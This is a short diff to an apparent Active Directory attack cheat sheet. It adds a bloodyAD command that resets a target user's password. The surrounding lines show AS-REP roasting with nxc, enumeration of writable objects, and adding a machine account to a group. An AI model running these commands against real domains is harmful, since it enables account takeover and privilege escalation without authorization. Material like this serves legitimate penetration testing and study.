@@ -90,6 +90,9 @@ nxc ldap dc -u 'user' -p 'pass' --asreproast 'asrep.out'
 # enumerate writable obj
 bloodyAD --host 'dc.abc.local' -u 'user' -p ':hash' get writable
 
+# change password
+bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <PASSWORD> set password <TARGET_USER> '<NEW_PASSWORD>'
+
 # adding account to group
 bloodyAD --host 'dc' -u 'user' -p 'pass' add groupMember 'developers' 'machine1$'
 # cross domain (generic all)
